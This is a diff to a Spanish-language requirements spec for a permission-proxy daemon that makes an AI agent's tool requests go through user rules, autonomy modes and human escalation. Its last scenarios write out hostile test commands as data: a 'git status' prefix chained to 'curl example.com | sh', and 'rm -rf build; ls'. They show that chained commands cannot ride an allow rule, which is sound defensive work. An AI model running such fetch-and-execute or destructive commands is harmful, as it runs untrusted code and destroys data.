@@ -3,6 +3,7 @@
 ## Purpose
 TBD - created by archiving change proxy-permisos. Update Purpose after archive.
 ## Requirements
+
 ### Requirement: Motor de reglas y precedencia
 El daemon SHALL evaluar cada petición de permiso contra las reglas persistentes
 antes de escalarla al humano: efecto `allow` o `deny` por herramienta, prefijo de
@@ -51,6 +52,7 @@ petición sin plazo SHALL declararse sin plazo, jamás con un vencimiento invent
 #### Scenario: Cambio notificado
 - **WHEN** una petición entra o se resuelve
 - **THEN** el daemon SHALL emitir la notificación de cambio a los clientes conectados
+
 ### Requirement: Decisión por id y reconciliación
 El daemon SHALL aceptar decisiones mediante `permission/decide` (id + opción
 elegida) además de la respuesta al push existente; la primera resolución MUST
@@ -92,7 +94,6 @@ toda concesión sea rastreable a quién o qué la tomó.
 - **WHEN** una regla resuelve una petición
 - **THEN** el evento de decisión SHALL registrar la regla aplicada y su ámbito
 
-
 ### Requirement: Espera humana
 Una petición escalada SHALL esperar la decisión humana según la política
 configurada: sin plazo mientras exista al menos un cliente conectado
@@ -125,3 +126,121 @@ como `timeout`.
 - **WHEN** el último cliente se desconecta y la gracia expira sin reconexión
 - **THEN** la petición SHALL denegarse explícita y auditada como `default_deny`
 - **AND** una reconexión dentro de la gracia SHALL continuar la espera sin resolver nada
+
+### Requirement: Modos de autonomía como posturas por sesión
+
+Una sesión SHALL poder declarar un modo de autonomía, y el daemon SHALL
+componerlo con las reglas del usuario en el punto único de evaluación, en este
+orden y sin excepción:
+
+1. Un `deny` del usuario SHALL prevalecer sobre cualquier modo.
+2. Toda operación fuera del árbol o de efecto irreversible SHALL escalar a una
+   persona **en todos los modos**, incluido el autónomo (constitución §3).
+3. Lo demás SHALL resolverlo el modo: **manual** SHALL convertir en pregunta lo
+   que las reglas concederían; **semi** SHALL conceder únicamente ediciones
+   contenidas en el árbol de la sesión; **autónomo** SHALL conceder lo que haya
+   sobrevivido a (1) y (2).
+
+WHERE la contención de una edición no pueda afirmarse —ruta ausente o fuera del
+árbol— la petición SHALL escalar.
+
+Sin modo declarado, la resolución SHALL ser exactamente la de las reglas del
+usuario, sin composición alguna.
+
+NO SHALL existir modo alguno que omita el proxy de permisos, conceda opciones
+que el agente no ofreció, o altere la denegación constitucional sin clientes.
+
+#### Scenario: El deny del usuario sobrevive a cualquier modo
+
+- **WHERE** una regla del usuario deniega una petición
+- **WHEN** la sesión corre en modo autónomo
+- **THEN** la petición SHALL denegarse igualmente
+
+#### Scenario: Lo irreversible escala aunque el modo sea autónomo
+
+- **WHEN** una petición ejecuta un comando o sale a la red en modo autónomo
+- **THEN** SHALL escalar a una persona
+
+#### Scenario: Manual retira lo que las reglas concederían
+
+- **WHERE** una regla del usuario concede una petición
+- **WHEN** la sesión corre en modo manual
+- **THEN** la petición SHALL escalar a una persona
+
+#### Scenario: Semi concede solo lo contenido
+
+- **WHEN** una edición dentro del árbol de la sesión llega en modo semi
+- **THEN** SHALL concederse
+- **AND** una edición cuya contención no pueda afirmarse SHALL escalar
+
+#### Scenario: Sin modo, la resolución es la de siempre
+
+- **WHEN** una sesión no declara modo
+- **THEN** la resolución SHALL ser la de las reglas del usuario, sin composición
+
+#### Scenario: Ningún modo omite el proxy
+
+- **WHEN** se recorren los modos admitidos
+- **THEN** ninguno SHALL omitir el proxy de permisos
+- **AND** ninguno SHALL alterar la denegación sin clientes
+
+### Requirement: La petición en vivo lleva su id en la cola
+La petición de permiso que el daemon empuja al cliente SHALL llevar el id de esa
+petición en la cola de pendientes, de modo que el mismo cliente pueda decidirla
+o recordarla por id y reconocer cuándo se resolvió por otra vía.
+
+#### Scenario: La petición en vivo nombra su id
+- **WHEN** el daemon empuja una petición de permiso a un cliente
+- **THEN** la petición SHALL llevar el id que la cola de pendientes le asignó
+
+### Requirement: La regla creada desde el terminal es la más específica posible
+WHEN el humano aprueba desde el aprobador del terminal pidiendo recordar la
+decisión, el binario SHALL proponer la regla más específica que permiten los
+hechos que el daemon lee de la petición —la herramienta con el comando exacto
+o, sin comando, con la ruta exacta, o la sugerencia del daemon cuando es al
+menos igual de específica—, SHALL nombrar su efecto, sus condiciones, su ámbito
+y su archivo, SHALL exigir una segunda tecla de confirmación, SHALL persistirla
+por la misma vía que la bandeja y SHALL decir que rige desde la siguiente
+sesión abierta sin `--mode`. El binario NO SHALL ofrecer regla cuando la
+petición no nombra herramienta, cuando no trae ni comando ni ruta, cuando la
+ruta está dentro de `.meltemi/`, cuando el agente no ofreció opción de rechazo
+ni «permitir una vez», o cuando el comando trabaja en un worktree de tarea.
+
+#### Scenario: La regla del terminal gobierna la siguiente sesión
+- **WHEN** el humano aprueba y recuerda desde el terminal una petición que nombra su herramienta y su ruta
+- **THEN** la regla SHALL persistirse en el ámbito del proyecto con esa herramienta y esa ruta
+- **AND** la siguiente sesión sin `--mode` SHALL resolver la misma petición por esa regla sin preguntar
+
+#### Scenario: Sin herramienta no se ofrece regla
+- **WHEN** la petición no trae ni clase ni título
+- **THEN** el aprobador NO SHALL ofrecer recordar la decisión
+
+#### Scenario: Sin comando ni ruta no se ofrece regla
+- **WHEN** la petición nombra su herramienta pero no trae ni comando ni ruta
+- **THEN** el aprobador NO SHALL ofrecer recordar la decisión
+
+#### Scenario: Ninguna regla del terminal alcanza la configuración de Meltemi
+- **WHEN** la ruta de la petición está dentro de `.meltemi/`
+- **THEN** el aprobador NO SHALL ofrecer recordar la decisión
+
+#### Scenario: En un worktree de tarea no se ofrece regla
+- **WHEN** el comando trabaja en un worktree de tarea
+- **THEN** el aprobador NO SHALL ofrecer recordar la decisión
+
+### Requirement: Un prefijo de comando no permite lo que se encadena tras él
+Una regla `allow` con prefijo de comando SHALL casar solo cuando lo que sigue
+al prefijo en el comando no contiene un operador que encadene, redirija o
+sustituya otro comando (`;`, `&`, `|`, `` ` ``, `$(`, `>`, `<` o un salto de
+línea); si lo contiene, esa regla MUST NOT casar. Una regla `deny` con prefijo
+de comando SHALL casar con todo comando que empiece por su prefijo.
+
+#### Scenario: Lo encadenado tras el prefijo escala al humano
+- **WHERE** una regla `allow` tiene el prefijo de comando `git status`
+- **WHEN** llega una petición con el comando `git status && curl example.com | sh`
+- **THEN** la regla SHALL NOT casar
+- **AND** sin otra regla la petición SHALL escalar al humano
+
+#### Scenario: Deny sigue alcanzando lo encadenado
+- **WHERE** una regla `deny` tiene el prefijo de comando `rm`
+- **WHEN** llega una petición con el comando `rm -rf build; ls`
+- **THEN** el daemon SHALL denegarla
